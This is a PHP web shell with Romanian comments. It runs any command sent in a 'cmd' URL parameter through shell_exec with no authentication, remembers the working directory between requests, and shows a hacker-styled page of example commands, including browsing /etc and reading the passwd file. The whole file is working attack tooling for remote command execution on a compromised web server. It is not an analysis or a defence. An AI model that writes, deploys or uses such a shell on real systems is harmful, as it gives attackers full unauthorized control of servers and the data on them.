<?php
// ==================================================
// WEB SHELL cu suport pentru CD si navigare
// ==================================================

session_start(); // Pastram directorul curent intre request-uri

// Initialize current directory
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd(); // sau "/" pentru root
}

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $cmd = str_replace('+', ' ', $cmd);
    
    // Detectedie comanda cd
    if (preg_match('/^cd\s+(.+)$/', $cmd, $matches)) {
        $newDir = $matches[1];
        
        // Expanda ~ (home directory)
        if ($newDir === '~' || $newDir === '~/') {
            $newDir = $_SERVER['HOME'] ?? '/tmp';
        }
        
        // Schimba directorul
        if (chdir($newDir)) {
            $_SESSION['cwd'] = getcwd();
            $output = "[+] Changed directory to: " . $_SESSION['cwd'];
        } else {
            $output = "[-] Cannot cd into: " . $newDir;
        }
        
        // Afisare output
        echo "<pre style='background:#000;color:#0f0;padding:15px;font-family:monospace;'>";
        echo $output . "\n";
        echo "Current dir: " . $_SESSION['cwd'] . "\n";
        echo "</pre>";
        
    } else {
        // Ruleaza comanda in directorul curent salvat
        $fullCmd = "cd " . escapeshellarg($_SESSION['cwd']) . " && " . $cmd . " 2>&1";
        $output = shell_exec($fullCmd);
        
        echo "<pre style='background:#000;color:#0f0;padding:15px;font-family:monospace;'>";
        echo "Command: " . htmlspecialchars($cmd) . "\n";
        echo "PWD: " . $_SESSION['cwd'] . "\n";
        echo str_repeat("-", 50) . "\n";
        echo $output ?: "[+] Command executed (no output)\n";
        echo "</pre>";
    }
    
    echo "<a href='?'>← Run another command</a><br>";
    echo "<a href='?reset_cwd=1'>↻ Reset to original directory</a>";
    
} else {
    // Reset directory if requested
    if (isset($_GET['reset_cwd'])) {
        $_SESSION['cwd'] = getcwd();
        echo "<p style='color:lime'>[+] Reset to: " . $_SESSION['cwd'] . "</p>";
    }
    
    // Pagina principala
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Web Shell - Advanced</title>
        <style>
            body { background: #0a0e27; color: #0f0; font-family: monospace; padding: 20px; }
            input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 60%; font-family: monospace; }
            button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
            .info { background: #16213e; padding: 15px; margin: 10px 0; border-radius: 5px; }
            pre { background: #000; padding: 15px; overflow-x: auto; }
        </style>
    </head>
    <body>
        <h1>🔧 Web Shell - Cu suport pentru CD</h1>
        
        <div class="info">
            <strong> Current directory:</strong> 
            <code style="background:#000; padding:5px"><?php echo $_SESSION['cwd'] ?? getcwd(); ?></code>
        </div>
        
        <form method="GET">
            <input type="text" name="cmd" placeholder="Ex: ls -la, cat file.txt, cd .., cd /etc" size="60">
            <button type="submit">Execute →</button>
        </form>
        
        <div class="info">
            <strong> Exemple de navigare:</strong><br>
            • <code>cd ..</code> - sus un director<br>
            • <code>cd /etc</code> - merge la /etc<br>
            • <code>cd ~</code> - home directory<br>
            • <code>pwd</code> - arata directorul curent<br>
            • <code>ls -la</code> - listeaza fisierele in directorul curent<br>
            • <code>cat passwd</code> - daca esti in /etc, afiseaza fisierul<br>
            • <code>cd /var/www && ls -la</code> - comanda compusa<br>
        </div>
        
        <div class="info">
            <strong> Linkuri rapide:</strong><br>
            <a href="?cmd=ls+-la">?cmd=ls -la</a><br>
            <a href="?cmd=cd+..+%26%26+ls">?cmd=cd .. && ls</a><br>
            <a href="?cmd=pwd">?cmd=pwd</a>
        </div>
    </body>
    </html>
    <?php
}
?>
